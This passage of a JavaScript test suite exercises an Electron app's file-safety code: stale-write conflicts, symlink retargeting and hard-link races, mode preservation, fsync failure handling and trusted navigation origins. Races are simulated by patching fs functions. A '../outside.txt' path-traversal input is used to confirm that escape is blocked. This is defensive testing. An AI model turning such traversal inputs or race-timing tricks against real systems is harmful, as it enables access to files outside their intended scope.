        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        const revalidationOtherPath = path.join(root, 'revalidation-other.md');
        await fs.promises.writeFile(revalidationOtherPath, 'other', { mode: 0o600 });
        const originalRevalidationRealpath = fs.promises.realpath;
        let documentRealpathCalls = 0;
        let revalidationMismatchConflict = false;
        try {
          fs.promises.realpath = async (...args) => {
            const resolved = await originalRevalidationRealpath.call(fs.promises, ...args);
            if (args[0] === documentPath && ++documentRealpathCalls === 4) return revalidationOtherPath;
            return resolved;
          };
          await writeValidatedTextFile(documentPath, 'must not save', { expectedContent: baseline });
        } catch (error) {
          revalidationMismatchConflict = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.realpath = originalRevalidationRealpath;
        }
        assert(revalidationMismatchConflict && await fs.promises.readFile(documentPath, 'utf8') === baseline,
          'the custom lexical-path revalidation mismatch must become TEXT_FILE_CONFLICT without writing');

        // A queued precondition is tied to the referent it loaded. If a final
        // symlink changes while it waits behind another writer, it must not
        // follow that newly selected file and apply the old baseline there.
        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        const retargetPath = path.join(root, 'retarget.md');
        await fs.promises.writeFile(retargetPath, 'separate target', { mode: 0o600 });
        const originalAccess = fs.promises.access;
        const originalRealpath = fs.promises.realpath;
        let holdFirstAccess;
        let releaseFirstAccess;
        const firstAccessReached = new Promise(resolve => { holdFirstAccess = resolve; });
        const releaseFirst = new Promise(resolve => { releaseFirstAccess = resolve; });
        let initialAliasResolved;
        const aliasInitialResolve = new Promise(resolve => { initialAliasResolved = resolve; });
        let delayedFirstAccess = false;
        let aliasRealpathCalls = 0;
        let retargetConflict = false;
        try {
          fs.promises.access = async (...args) => {
            const result = await originalAccess.call(fs.promises, ...args);
            if (!delayedFirstAccess && args[0] === canonicalDocumentPath) {
              delayedFirstAccess = true;
              holdFirstAccess();
              await releaseFirst;
            }
            return result;
          };
          fs.promises.realpath = async (...args) => {
            const result = await originalRealpath.call(fs.promises, ...args);
            if (args[0] === aliasPath && ++aliasRealpathCalls === 2) initialAliasResolved();
            return result;
          };
          const holder = writeValidatedTextFile(documentPath, 'lock holder', { expectedContent: baseline });
          await firstAccessReached;
          const queuedAliasWrite = writeValidatedTextFile(aliasPath, 'must not retarget', { expectedContent: baseline });
          await aliasInitialResolve;
          await fs.promises.unlink(aliasPath);
          await fs.promises.symlink(retargetPath, aliasPath, process.platform === 'win32' ? 'file' : undefined);
          releaseFirstAccess();
          await holder;
          await queuedAliasWrite;
        } catch (error) {
          retargetConflict = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.access = originalAccess;
          fs.promises.realpath = originalRealpath;
          releaseFirstAccess?.();
        }
        assert(retargetConflict && await fs.promises.readFile(retargetPath, 'utf8') === 'separate target',
          'a queued expected-baseline write must report TEXT_FILE_CONFLICT instead of following a repointed symlink');

        // Omitting the optional precondition preserves existing internal and
        // two-argument callers, and a conflict must release its lock for later work.
        await writeValidatedTextFile(documentPath, 'legacy call');
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'legacy call',
          'the legacy two-argument writer call must remain compatible');
        await writeValidatedTextFile(documentPath, 'after conflict', { expectedContent: 'legacy call' });
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'after conflict',
          'a rejected writer must release the canonical-path FIFO lock');

        return {
          committedWinner: settled,
          conflictCode: conflicts[0].reason.code,
          identicalWrites: identical.length,
          inPlaceRaceRejected,
          initialMissingConflict,
          revalidationMismatchConflict,
          retargetConflict,
          legacyCompatible: true,
        };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'hard-linked text files reject content changes without detaching aliases',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-hardlink-');
      const documentPath = path.join(root, 'original.md');
      const hardLinkPath = path.join(root, 'linked.md');
      const raceLinkPath = path.join(root, 'race-linked.md');
      const baseline = 'shared hard-link baseline';
      try {
        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        await fs.promises.link(documentPath, hardLinkPath);
        const preview = await readValidatedTextFile(documentPath);
        assert(preview.content === baseline,
          'hard-linked files must remain readable for previews and conflict resolution');

        let hardLinkRejected = false;
        try {
          await writeValidatedTextFile(documentPath, 'must not detach linked.md', { expectedContent: baseline });
        } catch (error) {
          hardLinkRejected = error?.code === 'TEXT_FILE_HARDLINK_UNSUPPORTED'
            && error.message === 'Text files with multiple hard links cannot be edited safely. Break the hard link before saving changes.';
        }
        assert(hardLinkRejected
          && await fs.promises.readFile(documentPath, 'utf8') === baseline
          && await fs.promises.readFile(hardLinkPath, 'utf8') === baseline,
        'a content-changing save must reject a pre-existing hard link without splitting either alias');

        electronPkg.ipcMain.__clearInvokeHandlers();
        registerFilesystemHandlers();
        const writeText = electronPkg.ipcMain.__getInvokeHandler('write-text-file');
        const ipcHardLink = await writeText(senderEvent(), {
          filePath: documentPath,
          content: 'must not detach via IPC',
          expectedContent: baseline,
        });
        assert(ipcHardLink?.success === false
          && ipcHardLink?.errorCode === 'TEXT_FILE_HARDLINK_UNSUPPORTED',
        `IPC must preserve the actionable hard-link code, got ${JSON.stringify(ipcHardLink)}`);

        await writeValidatedTextFile(documentPath, baseline, { expectedContent: baseline });
        assert(await fs.promises.readFile(hardLinkPath, 'utf8') === baseline,
          'an idempotent same-content durability retry must remain allowed for a hard-linked file');

        await fs.promises.unlink(hardLinkPath);
        const canonicalPath = await fs.promises.realpath(documentPath);
        const originalLstat = fs.promises.lstat;
        let targetLstatCalls = 0;
        let raceRejected = false;
        try {
          fs.promises.lstat = async (...args) => {
            const stat = await originalLstat.call(fs.promises, ...args);
            if (args[0] === canonicalPath && ++targetLstatCalls === 4) {
              // The first single-link check has just read nlink=1. Add an alias
              // while the private temp is written; the near-rename recheck must
              // catch it before replacing either directory entry.
              await fs.promises.link(documentPath, raceLinkPath);
            }
            return stat;
          };
          await writeValidatedTextFile(documentPath, 'must not race-detach', { expectedContent: baseline });
        } catch (error) {
          raceRejected = error?.code === 'TEXT_FILE_HARDLINK_UNSUPPORTED';
        } finally {
          fs.promises.lstat = originalLstat;
        }
        const leftovers = await fs.promises.readdir(root);
        assert(raceRejected
          && await fs.promises.readFile(documentPath, 'utf8') === baseline
          && await fs.promises.readFile(raceLinkPath, 'utf8') === baseline
          && !leftovers.some(name => name.startsWith('.__ic_text_') && name.endsWith('.tmp')),
        'a hard link added during the temp-write window must reject before rename and clean the private temp');
        return { hardLinkRejected, idempotentAllowed: true, raceRejected };
      } finally {
        electronPkg.ipcMain.__clearInvokeHandlers();
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'validated text reads preserve CAS-exact BOM, Unicode, CRLF, and stale baselines',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-read-ipc-');
      const documentPath = path.join(root, 'notes.md');
      const symlinkPath = path.join(root, 'notes-link.md');
      const event = senderEvent();
      // The BOM and CRLFs are intentional: browser Response.text() strips the
      // former, while the Node CAS writer compares it literally.
      const baseline = '\uFEFF# café\r\n\r\nA snowman: ☃\r\n';
      const edited = `${baseline}next line ✓\r\n`;
      const external = '\uFEFFexternal writer\r\n';
      try {
        await fs.promises.writeFile(documentPath, baseline, { encoding: 'utf8', mode: 0o600 });
        // /tmp itself is a symlink on some platforms; use its real spelling to
        // exercise the direct-path merge-token branch rather than treating the
        // test fixture's temp-root alias as a stable renderer identity.
        const directPath = await fs.promises.realpath(documentPath);
        const directRead = await readValidatedTextFile(directPath);
        const directBaseline = directRead.content;
        assert(directBaseline === baseline
          && directRead.targetToken === directPath
          && directRead.sessionIdentityToken === directRead.targetToken,
          'validated direct text reads must retain the UTF-8 baseline and issue a merge token for a non-symlink path');
        await fs.promises.symlink(documentPath, symlinkPath, process.platform === 'win32' ? 'file' : undefined);
        const symlinkRead = await readValidatedTextFile(symlinkPath);
        assert(symlinkRead.targetToken === directRead.targetToken
          && symlinkRead.sessionIdentityToken === undefined,
        'a symlink read keeps its CAS target but must not receive a shared-session merge token');

        await writeValidatedTextFile(documentPath, edited, {
          expectedContent: directBaseline,
          expectedTargetToken: directRead.targetToken,
        });
        assert(await fs.promises.readFile(documentPath, 'utf8') === edited,
          'a CAS write using the validated baseline must accept an edited BOM-prefixed document and preserve its line endings');

        electronPkg.ipcMain.__clearInvokeHandlers();
        registerFilesystemHandlers();
        const readText = electronPkg.ipcMain.__getInvokeHandler('read-text-file');
        const writeText = electronPkg.ipcMain.__getInvokeHandler('write-text-file');
        const response = await readText(event, documentPath);
        assert(response?.success === true && response.content === edited
          && response.targetToken === await fs.promises.realpath(documentPath),
          'read-text-file IPC must return the exact Node UTF-8 string used by the CAS writer');

        await fs.promises.writeFile(documentPath, external, { encoding: 'utf8', mode: 0o600 });
        const stale = await writeText(event, {
          filePath: documentPath,
          content: `${edited}must not overwrite\r\n`,
          expectedContent: response.content,
          expectedTargetToken: response.targetToken,
        });
        assert(stale?.success === false && stale.errorCode === 'TEXT_FILE_CONFLICT'
          && await fs.promises.readFile(documentPath, 'utf8') === external,
        'a validated baseline must still reject a deterministic external stale write without changing disk');
        return { bomPreserved: true, unicodePreserved: true, crlfPreserved: true, staleConflict: true, symlinkMergeExcluded: true };
      } finally {
        electronPkg.ipcMain.__clearInvokeHandlers();
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'validated text reads reject a direct-path replacement during shared-session classification',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-read-identity-race-');
      const canonicalRoot = await fs.promises.realpath(root);
      const documentPath = path.join(canonicalRoot, 'notes.md');
      const replacementPath = path.join(canonicalRoot, 'replacement.md');
      const displacedPath = path.join(canonicalRoot, 'displaced.md');
      const originalLstat = fs.promises.lstat;
      let targetLstatCalls = 0;
      let replacedDuringClassification = false;
      try {
        await Promise.all([
          fs.promises.writeFile(documentPath, 'original bytes', { mode: 0o600 }),
          fs.promises.writeFile(replacementPath, 'replacement bytes', { mode: 0o600 }),
        ]);
        fs.promises.lstat = async (...args) => {
          const stat = await originalLstat.call(fs.promises, ...args);
          if (args[0] === documentPath && ++targetLstatCalls === 3) {
            // Calls one/two inspect and revalidate the bytes. Call three is
            // pathContainsSymlinkComponent's final lexical component. Replace
            // it after that stat has observed "direct", reproducing the old
            // classification→return gap deterministically.
            await fs.promises.rename(documentPath, displacedPath);
            await fs.promises.rename(replacementPath, documentPath);
            replacedDuringClassification = true;
          }
          return stat;
        };
        let conflict = false;
        try {
          await readValidatedTextFile(documentPath);
        } catch (error) {
          conflict = error?.code === 'TEXT_FILE_CONFLICT';
        }
        assert(replacedDuringClassification && conflict
          && await fs.promises.readFile(documentPath, 'utf8') === 'replacement bytes'
          && await fs.promises.readFile(displacedPath, 'utf8') === 'original bytes',
        'a path swapped after lexical directness was observed must reject the old baseline instead of issuing its target as a merge token');
        return { replacedDuringClassification, conflict };
      } finally {
        fs.promises.lstat = originalLstat;
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'write-text-file IPC preserves TEXT_FILE_CONFLICT for the renderer',
    run: async () => {
      // macOS os.tmpdir() lives under /var and is intentionally blocked by the
      // mutable-path guard, so use the ordinary /tmp test root here.
      const root = await fs.promises.mkdtemp('/tmp/ic-write-ipc-conflict-');
      const documentPath = path.join(root, 'notes.md');
      const event = senderEvent();
      try {
        await fs.promises.writeFile(documentPath, 'current disk text', { mode: 0o600 });
        electronPkg.ipcMain.__clearInvokeHandlers();
        registerFilesystemHandlers();
        const writeText = electronPkg.ipcMain.__getInvokeHandler('write-text-file');
        const response = await writeText(event, {
          filePath: documentPath,
          content: 'stale editor text',
          expectedContent: 'old disk text',
        });
        assert(response?.success === false && response?.errorCode === 'TEXT_FILE_CONFLICT',
          `write-text-file must preserve a renderer-actionable conflict response, got ${JSON.stringify(response)}`);
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'current disk text',
          'a stale IPC write must leave the current disk content untouched');
        return { ipcConflictCodePreserved: true };
      } finally {
        electronPkg.ipcMain.__clearInvokeHandlers();
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'portable relative file paths cannot escape their canvas directory',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-portable-path-'));
      const canvasDir = path.join(root, 'canvas');
      const canvasPath = path.join(canvasDir, 'workspace.json');
      const outsideFile = path.join(root, 'outside.txt');
      const insideFile = path.join(canvasDir, 'attachments', 'inside.txt');
      try {
        await fs.promises.mkdir(path.dirname(insideFile), { recursive: true });
        await Promise.all([
          fs.promises.writeFile(outsideFile, 'private'),
          fs.promises.writeFile(insideFile, 'portable'),
        ]);
        const data = { nodes: [
          { data: { filePath: '/missing/stale.txt', relativeFilePath: '../outside.txt' } },
          { data: { filePath: '/missing/inside.txt', relativeFilePath: 'attachments/inside.txt' } },
        ] };
        await resolvePortableFilePaths(data, canvasPath);
        assert(data.nodes[0].data.filePath === '/missing/stale.txt',
          `relative traversal must not substitute an outside file, got ${data.nodes[0].data.filePath}`);
        assert(data.nodes[1].data.filePath === insideFile,
          'a legitimate relative descendant should still resolve');
        return { outsideBlocked: true, insideResolved: true };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'canvas text mutations are bounded and atomic writes retain private file modes',
    run: async () => {
      // Use /tmp rather than os.tmpdir(): macOS points the latter into /var,
      // which is intentionally on the production sensitive-path blocklist.
      const root = await fs.promises.mkdtemp('/tmp/ic-text-mutation-');
      const canvasPath = path.join(root, 'workspace.json');
      const textPath = path.join(root, 'notes.txt');
      const binaryPath = path.join(root, 'image.png');
      const newPath = path.join(root, 'new-note.md');
      try {
        await Promise.all([
          fs.promises.writeFile(canvasPath, '{}'),
          fs.promises.writeFile(textPath, 'old notes', { mode: 0o640 }),
          fs.promises.writeFile(binaryPath, 'not really an image'),
        ]);
        assert(await validateMutablePath(textPath, { textOnly: true }) === await fs.promises.realpath(textPath),
          'ordinary absolute .txt files remain editable');
        let nonTextRejected = false;
        try { await validateMutablePath(binaryPath, { textOnly: true }); }
        catch (error) { nonTextRejected = /Only .md and .txt/.test(error.message); }
        let canvasRejected = false;
        try { await validateMutablePath(canvasPath, { sender: { __canvasPath: canvasPath }, textOnly: false }); }
        catch (error) { canvasRejected = /open canvas/.test(error.message); }
        let containingFolderRejected = false;
        try { await validateMutablePath(root, { sender: { __canvasPath: canvasPath }, textOnly: false }); }
        catch (error) { containingFolderRejected = /folder containing it/.test(error.message); }
        assert(nonTextRejected && canvasRejected && containingFolderRejected,
          'renderer mutations must reject non-text editor targets and the open canvas or its containing folder');

        await atomicWriteFile(newPath, 'private by default');
        await atomicWriteFile(textPath, 'updated notes');
        const newMode = (await fs.promises.stat(newPath)).mode & 0o777;
        const retainedMode = (await fs.promises.stat(textPath)).mode & 0o777;
        assert(await fs.promises.readFile(textPath, 'utf8') === 'updated notes'
          && (process.platform === 'win32' || (newMode === 0o600 && retainedMode === 0o640)),
        `atomic writes must preserve existing mode and make new files owner-only (got ${newMode.toString(8)}/${retainedMode.toString(8)})`);
        return { nonTextRejected, canvasRejected, containingFolderRejected, newMode, retainedMode };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'validated text writes preserve exact modes and fail closed until parent sync succeeds',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-durability-');
      const documentPath = path.join(root, 'shared.md');
      const originalUmask = process.umask();
      try {
        // fs.writeFile is also umask-masked, so establish the exact target mode
        // before exercising the writer under the common restrictive umask.
        await fs.promises.writeFile(documentPath, 'baseline', { mode: 0o600 });
        await fs.promises.chmod(documentPath, 0o664);
        process.umask(0o022);
        await writeValidatedTextFile(documentPath, 'mode preserved', { expectedContent: 'baseline' });
        const mode = (await fs.promises.stat(documentPath)).mode & 0o777;
        assert(process.platform === 'win32' || mode === 0o664,
          `the temp must restore target permissions after umask masking (expected 664, got ${mode.toString(8)})`);

        const calls = [];
        const synced = await syncTextParentDirectory('/virtual/parent', {
          open: async (directory, flags) => {
            calls.push(`open:${directory}:${flags}`);
            return {
              sync: async () => { calls.push('sync'); },
              close: async () => { calls.push('close'); },
            };
          },
        });
        assert(synced && calls.join('|') === 'open:/virtual/parent:r|sync|close',
          `parent fsync must open, sync, then close in order (${calls.join('|')})`);

        const unsupported = Object.assign(new Error('directory sync unsupported'), { code: 'EINVAL' });
        const unsupportedResult = await syncTextParentDirectory('/virtual/unsupported', {
          open: async () => { throw unsupported; },
        });
        assert(unsupportedResult === false,
          'only documented unsupported directory-sync errors may resolve as a no-op');
        const accessDenied = Object.assign(new Error('permission denied'), { code: 'EACCES' });
        let accessDeniedSurfaced = false;
        try {
          await syncTextParentDirectory('/virtual/denied', { open: async () => { throw accessDenied; } });
        } catch (error) {
          accessDeniedSurfaced = error === accessDenied;
        }
        assert(accessDeniedSurfaced,
          'a real parent-directory access failure must fail closed instead of claiming durability');

        // Model a rename that succeeds but whose directory barrier reports a
        // real I/O failure. The caller must receive failure, leave no temp, and
        // an idempotent retry must execute the durability barrier again.
        // The writer opens and syncs the temp first, then opens and syncs the
        // parent after rename. Inject failure into that second FileHandle.sync
        // call without replacing fs.promises.open (the production helper binds
        // its default opener at module initialization).
        const probe = await fs.promises.open(documentPath, 'r');
        const fileHandlePrototype = Object.getPrototypeOf(probe);
        await probe.close();
        const realSync = fileHandlePrototype.sync;
        let syncCalls = 0;
        fileHandlePrototype.sync = async function (...args) {
          syncCalls += 1;
          if (syncCalls === 2) {
            throw Object.assign(new Error('injected directory I/O failure'), { code: 'EIO' });
          }
          return realSync.apply(this, args);
        };
        let failedClosed = false;
        try {
          await writeValidatedTextFile(documentPath, 'renamed but unsynced', { expectedContent: 'mode preserved' });
        } catch (error) {
          failedClosed = error?.code === 'TEXT_FILE_DURABILITY_UNVERIFIED'
            && error?.durabilityErrorCode === 'EIO';
        } finally {
          fileHandlePrototype.sync = realSync;
        }
        const leftovers = await fs.promises.readdir(root);
        assert(failedClosed && syncCalls === 2
          && await fs.promises.readFile(documentPath, 'utf8') === 'renamed but unsynced'
          && !leftovers.some(name => name.startsWith('.__ic_text_') && name.endsWith('.tmp')),
        'a post-rename directory-sync I/O failure must retain its explicit durability code while retaining the completed rename and cleaning its temp');
        await writeValidatedTextFile(documentPath, 'renamed but unsynced', { expectedContent: 'mode preserved' });
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'renamed but unsynced',
          'an idempotent retry after a failed directory barrier must succeed only after retrying parent sync');
        return { mode, syncCalls, failedClosed };
      } finally {
        process.umask(originalUmask);
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    // A resumed run seeds sourceResults from recovered staging and then
    // RE-SCRAPES the unfinished sources, so those seeded entries flow into the
    // manual-result loop that merges pagesWalked and adds to stopReasons. When
    // the seed omitted those two fields the merge read Math.max(undefined, n)
    // (silent NaN) and then threw on `.add` of undefined — after the full
    // gather, so every resume of that canvas re-scraped for minutes and then
    // crashed again. Both initializers must therefore agree on the shape.
    name: 'job search: recovered-staging seed and manual-result init agree on the sourceResults shape',
    run: () => {
      const src = fs.readFileSync(path.resolve('electron/ipc/jobs.js'), 'utf8');
      const inits = [...src.matchAll(/sourceResults\[\w+\]\s*=\s*\{([^}]*)\}/g)].map(m => m[1]);
      assert(inits.length >= 2,
        `expected at least the seed and the manual-result initializer, found ${inits.length}`);
      const merging = inits.filter(body => /jobs\s*:\s*\[\]/.test(body));
      assert(merging.length >= 2,
        `expected at least two sourceResults initializers, found ${merging.length}`);
      for (const body of merging) {
        assert(/pagesWalked\s*:/.test(body),
          `every sourceResults initializer must seed pagesWalked, missing in: {${body.trim()}}`);
        assert(/stopReasons\s*:\s*new Set\(\)/.test(body),
          `every sourceResults initializer must seed a stopReasons Set, missing in: {${body.trim()}}`);
      }
      return { initializers: merging.length };
    },
  },
  {
    name: 'Electron smoke: sidebar module drag settles layout and avoids nested-canvas group routing',
    run: () => {
      const smoke = fs.readFileSync(path.resolve('scripts/electron-smoke.js'), 'utf8');
      const helperAt = smoke.indexOf('async function waitForStableBox');
      const safeTargetHelperAt = smoke.indexOf('async function findTopLevelModuleDropPosition');
      const jobsAt = smoke.indexOf("step('exercise sidebar drag/drop panels and issue reporter')");
      const dragAt = smoke.indexOf('await jobModuleCard.dragTo(', jobsAt);
      const settledCardAt = smoke.indexOf("await waitForStableBox(jobModuleCard, 'Job Search module card')", jobsAt);
      const settledPaneAt = smoke.indexOf("await waitForStableBox(canvasPane, 'canvas pane after opening Jobs sidebar')", jobsAt);
      assert(helperAt >= 0 && jobsAt >= 0 && dragAt > jobsAt
        && settledCardAt > jobsAt && settledPaneAt > settledCardAt && settledPaneAt < dragAt
        && safeTargetHelperAt >= 0
        && smoke.slice(jobsAt, dragAt).includes('const jobDropPosition = await findTopLevelModuleDropPosition(page);')
        && smoke.slice(dragAt, dragAt + 200).includes('targetPosition: jobDropPosition')
        && smoke.includes("jobHub.getByRole('textbox', { name: /^Target role/i })")
        && !smoke.includes("input[placeholder^=\"Target role\"]"),
      'the smoke must wait for sidebar/card geometry to settle, choose a point outside nested-canvas groups, and locate Target role through its accessible label rather than presentation copy');
      return { stableBeforeDrag: true, avoidsGroup: true, accessibleTargetRole: true };
    },
  },
  {
    name: 'canvas navigation trusts only dist in production and the configured Vite origin in development',
    run: () => {
      const distDir = path.join(path.sep, 'app', 'dist');
      const bundled = pathToFileURL(path.join(distDir, 'index.html')).href;
      const escaped = pathToFileURL(path.join(path.sep, 'app', 'private.html')).href;
      assert(isTrustedCanvasNavigation(bundled, { distDir }), 'production accepts bundled dist content');
      assert(!isTrustedCanvasNavigation(escaped, { distDir }), 'production rejects file content outside dist');
      assert(!isTrustedCanvasNavigation('https://app.example.test', { distDir }), 'production rejects remote origins');

      const devServerUrl = 'http://localhost:5173';
      assert(isTrustedCanvasNavigation('http://localhost:5173/?init=blank', { devServerUrl, distDir }),
        'development accepts the configured Vite origin');
      assert(!isTrustedCanvasNavigation('http://127.0.0.1:5173/', { devServerUrl, distDir }),
        'development rejects a different loopback origin');
      assert(!isTrustedCanvasNavigation('http://localhost:4173/', { devServerUrl, distDir }),
        'development rejects a different Vite port');
      return { production: 'dist-only', development: 'exact-origin' };
    },
  },
];
